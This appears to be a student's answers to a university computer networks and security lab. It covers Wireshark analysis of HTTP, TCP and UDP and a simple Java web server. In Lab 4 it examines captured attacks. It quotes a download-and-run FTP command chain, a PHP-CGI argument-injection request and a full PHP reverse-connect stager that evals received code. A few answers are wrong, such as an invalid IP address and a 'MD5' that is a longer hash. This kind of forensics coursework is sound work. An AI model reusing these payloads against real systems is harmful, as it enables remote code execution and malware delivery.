# 2IC60 Computer Networks and Security Lab Sessions

<br>

# Lab 1

## Exercise 1

How long did it take from when the HTTP GET message 4 was sent until the HTTP OK reply was received?

- **0.189775 seconds**

## Exercise 2

What is the Internet address of the gaia.cs.umass.edu (also
known as www.net.cs.umass.edu)?

- **128.119.245.12**

What is the Internet address of your computer?

- **10.0.2.15**

## Exercise 3

Print the two HTTP messages displayed in step 9
above to file.

- **DONE**

## Exercise 4

The pcap file security1.win.tue.nl/~aamadori/2IC60/Lab1/HTTP_traffic.pcap. contains some traffic captured during web browsing. Load the file in wireshark
What image was looked at?

- **A 2D color drawing of a Pig's face**

What action was taken, with what parameters?

- **POST request to http://httpbin.org/forms/post with application/x-www-form-urlencoded value:**
  ````{
          "custname": "Alessandro",
          "custtel": "0612345678",
          "custemail": "a.amadori@tue.nl",
          "size": "large",
          "topping": [
              "bacon",
              "cheese",
              "mushroom"
          ],
          "delivery": "20:30",
          "comments": "No pineapple please"
          }```
  ````

<br><br>

# Lab 2

## Exercise 1

What is the IP address and TCP port number used by your client computer (source) to transfer the file to gaia.cs.umass.edu?

- **10.0.2.15:39217**

What is the IP address and port number used by gaia.cs.umass.edu to receive the file? Fill the gaps.

- **128.119.256:80**

## Exercise 2

What is the sequence number of the TCP SYN segment that is used to initiate the TCP connection between the client computer and gaia.cs.umass.edu?

- **Sequence Number: 0**

What is it in the segment that identifies the segment as a
SYN segment? (Look at flags)

- All flags (bytes) are _Not Set_ (0), except the _Syn_ flag, which is Set (1)

### Exercise 3

What is the sequence number of the SYNACK segment sent by gaia.cs.umass.edu to the client computer in reply to the SYN?

- **Sequence Number: 0**

What is the value of the ACKnowledgement field in the SYNACK segment? How did gaia.cs.umass.edu determine that value?

- Acknowledgment number: 1

What is it in the segment that identifies the segment as a SYNACK segment? (Check flags)

- The flags _Syn_ and _Acknowledgement_ flag are _Set_ (1)

### Exercise 4

What is the sequence number of the TCP segment containing the
HTTP POST command?

- **Sequence Number: 1**

## Excercise 5

Consider the TCP segment containing the HTTP POST as the first segment in the TCP connection. We aim to calculate Estimated RTT after 3rd segment:

What are the sequence numbers of the first six segments in the TCP
connection (including the segment containing the HTTP POST)? At what time was each segment sent? When was the ACK for each segment received? Given the difference between when each TCP segment was sent, and when its acknowledgement was received, what is the RTT value for each of the three segments? What is the EstimatedRTT value after 3rd segment in the TCP connection?

  - The EstimatedRTT value after the 3rd segment is 0.007555 seconds.
  
    | Segment | Sequence Number | Sent (Time) | ACK Received Time | RTT (s)  |
    | ------- | --------------- | ----------- | ----------------- | -------- |
    | 1       | 1               | 0           | 0.001516          | 0.001516 |
    | 2       | 14601           | 0.000555    | 0.008296          | 0.006962 |
    | 3       | 20441           | 0.000656    | 0.008296          | 0.007555 |

## Excercise 6

What are the lengths of TCP segments?

  - 
    | Segment | Length |
    | ------- | ------ |
    | 1       | 1      |
    | 2       | 14601  |
    | 3       | 20441  |
  

## Excercise 7

From this packet, determine how many fields there are
in the UDP header. Name these fields.

- 4 fields: Source port, Destination Port, Length, Checksum


## Excercise 8 - 10

From the packet content field, determine the length (in
bytes) of each of the UDP header fields.
  - All fields have a length of 2 bytes

The value in the Length field is the length of what?
- Length of the UDP header and UDP data (between 8 and 65,535 bytes)

Verify your claim with your captured UDP packet.
- The value of the Length UDP header is 49. The length of the header is 8 bytes and the length of the UDP Data is 41 bytes. 
- UDP Data (_"safebrowsing.google.com"_)
  ```
  17 61 01 00 00 01 00 00 00 00 00 00 0c 73 61 66 65 62 72 6f 77 73 69 6e 67 06 67 6f 6f 67 6c 65 03 63 6f 6d 00 00 01 00 01
  ```

What is the protocol number for UDP? Give your
answer in both hexadecimal and decimal notation.
- Hexadecimal: 11, Decimal: 17

# Lab 3
Multi-Threaded Web Server

<br>

### webServer.java
```java
package socket_programming;
/**
*
* @author sozen
*/
import java.io.* ;
import java.net.* ;
import java.util.* ;
public final class WebServer {
    public static void main(String argv[]) throws Exception {
  // Get the port number from the command line.
  int port = 6789;
        ServerSocket listener = new ServerSocket(port);
  
  // Process HTTP service requests in an infinite loop.
  while (true) {
      // Listen for a TCP connection request.
            Socket socket = listener.accept();
      // Construct an object to process the HTTP request message.
      HttpRequest request = new HttpRequest(socket);
      
      // Create a new thread to process the request.
      Thread thread = new Thread(request);
      
      // Start the thread.
      thread.start();
  }
    }
}
```
<br>

### HttpRequest.java
```java
package socket_programming;
import java.io.* ;
import java.net.* ;
import java.util.* ;
final class HttpRequest implements Runnable {
    final static String CRLF = "\r\n";
    Socket socket;
    
    // Constructor
    public HttpRequest(Socket socket) throws Exception {
    this.socket = socket;
    }
    
    // Implement the run() method of the Runnable interface.
    public void run() {
    try {
        processRequest();
    } catch (Exception e) {
        System.out.println(e);
  }
    }
    private void processRequest() throws Exception {
  // Get a reference to the socket's input and output streams.
        InputStream is = this.socket.getInputStream();
  DataOutputStream os = new DataOutputStream(this.socket.getOutputStream());
        
  
  // Set up input stream filters.
        
  BufferedReader br = new BufferedReader(new InputStreamReader(is));
        
        
        // Get the request line of the HTTP request message.
        String requestLine = br.readLine();
        
        // Extract the filename from the request line.
        StringTokenizer tokens = new StringTokenizer(requestLine);
        tokens.nextToken();  // skip over the method, which should be "GET"
        String fileName = tokens.nextToken();
  
        // Prepend a "." so that file request is within the current directory.
        fileName = "." + fileName ;
  
  // Open the requested file.
        FileInputStream fis = null ;
        boolean fileExists = true ;
        try {
      fis = new FileInputStream(fileName);
        } catch (FileNotFoundException e) {
      fileExists = false ;
        }
  // Debug info for private use
  System.out.println("Incoming!!!");
  System.out.println(requestLine);
  String headerLine = null;
  while ((headerLine = br.readLine()).length() != 0) {
      System.out.println(headerLine);
  }
  
  // Construct the response message.
        String statusLine = null;
        String contentTypeLine = null;
        String entityBody = null;
        if (fileExists) {
      statusLine = "HTTP/1.0 200 OK" + CRLF;
      contentTypeLine = "Content-Type: " + 
    contentType(fileName) + CRLF;
        } else {
      statusLine = "HTTP/1.0 " + CRLF;
      contentTypeLine = "Content-Type: text/html" + CRLF;
      entityBody = "<HTML>" + 
    "<HEAD><TITLE>FILE COULD NOT BE FOUND</TITLE></HEAD>" +
    "<BODY></BODY></HTML>";
        }
  // Send the status line.
        os.writeBytes(statusLine);
      
        // Send the content type line.
        os.writeBytes(contentTypeLine);
        // Send a blank line to indicate the end of the header lines.
        os.writeBytes(CRLF);
        // Send the entity body.
        if (fileExists) {
      sendBytes(fis, os);
      fis.close();
        } else {
      os.writeBytes(entityBody) ;
            os.writeBytes("<html><body><h1>FILE DOES NOT EXIST </h1><p>TRY AGAIN</p></body></html>");
        }
        // Close streams and socket.
        os.close();
        br.close();
        socket.close();
    }
    private static void sendBytes(FileInputStream fis, 
          OutputStream os) throws Exception {
  // Construct a 1K buffer to hold bytes on their way to the socket.
  byte[] buffer = new byte[1024];
  int bytes = 0;
  
  // Copy requested file into the socket's output stream.
  while ((bytes = fis.read(buffer)) != -1) {
      os.write(buffer, 0, bytes);
  }
    }
    private static String contentType(String fileName) {
  if(fileName.endsWith(".htm") || fileName.endsWith(".html")) {
      return "text/html";
  }
  if(fileName.endsWith(".ram") || fileName.endsWith(".ra")) {
      return "audio/x-pn-realaudio";
  }
  return "application/octet-stream" ;
    }
}
```

# Lab 4

## Exercise 1

Identify the IP addresses of the attacker and the target.
- 192.168.223.171 (attacker) and 192.168.223.172 (target)
How many connection attempts have been made by the attacker?
- 65530
How many of the ports are open?
- 30 
  ```
  ip.src==192.168.223.172 and ip.dst==192.168.223.171 and tcp.flags.syn==1
  ```
Identify / guess the services running on the open ports.
- ssh, mysql, ftp, postgresql, telnet, sunrpc, etc.

## Exercise 2

Which IP addresses are involved?
  - 98.114.205.102, 192.150.11.111

What is the duration of the packet capture?
  - 16.2192 seconds

Which application-layer protocols are detected by Wireshark?
  - SMB (Server Message Block Protocol)
  - NetBIOS, Distributed Computing Environemnt, (DCE/RPC), Active Directory Setup

How many TCP sessions are in the file?
  - 5

Identify the attacker’s IP address and location (use a free online tool such as ip2location.com).
  - United States, Pennsylvania	Philadelphia, lat: 39.9523, lng: -75.1638


Check the conversation content in TCP stream #3. Which application-level protocol is used?
  - SQL Server Management Studio

Identify the attacker’s and the victim’s native operating system and version (Hint: check packets 16 and 17)
  - Windows 5.1 (Victim) and Windows 2000 2195 (Attacker)

Identify the script used by the attacker after compromising the system. (Hint: TCP stream 2)
  - Script used:
    ```
    echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
    ssms.exe
    ```

    ```
    220 NzmxFtpd 0wns j0
      USER 1

    331 Password required
      PASS 1

    230 User logged in.
      SYST

    215 NzmxFtpd
      TYPE I

    200 Type set to I.
      PORT 192,150,11,111,4,56

    200 PORT command successful.
      RETR ssms.exe

    150 Opening BINARY mode data connection
      QUIT

    226 Transfer complete.
    221 Goodbye happy r00ting
    ```

A malware binary is downloaded by the host at TCP stream #4. Obtain a copy of the file (might trigger your anti-virus if not using VM). Get the md5 sum of the binary and identify it at virustotal.com.
  - MD5 of _smss.exe_: 
    ```
    b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d
    ```




## Exercise 3

List the hosts (IP addresses) in the traffic.
  - 10.142.0.1, 10.142.0.2, 10.142.0.3

Identify the packet that sends the initial malicious query.
  - Packet information:
    ``` 
    6	2013-04-29 14:00:34.295022	10.142.0.2	10.142.0.1	HTTP	1432	POST /?--define+allow_url_include%3don+-%64+safe_mode%3doff+--define+suhosin.simulation%3d1+--define+disable_functions%3d%22%22+-d+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-%6e++ HTTP/1.1  (application/x-www-form-urlencoded)
    ```
  - PHP Script
    ```php
    <?php
    error_reporting(0);
    $ip   = '10.142.0.2';
    $port = 4444;
    $ipf  = AF_INET;
    if (FALSE !== strpos($ip, ":")) {
        $ip  = "[" . $ip . "]";
        $ipf = AF_INET6;
    }
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f($ipf, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();
    ```


Identify the attacker (malicious client) and the victim (web server).
  - Attacker: 10.142.0.2, Victim: 	10.142.0.1

(optional) Analyze the contents of the packet containing malicious query. What do you think is the effect of the query on the web server? How does the attacker follow-up on the initial malicious query?
    - Creates a socket connection on ip port 4444 to listen to messages 
  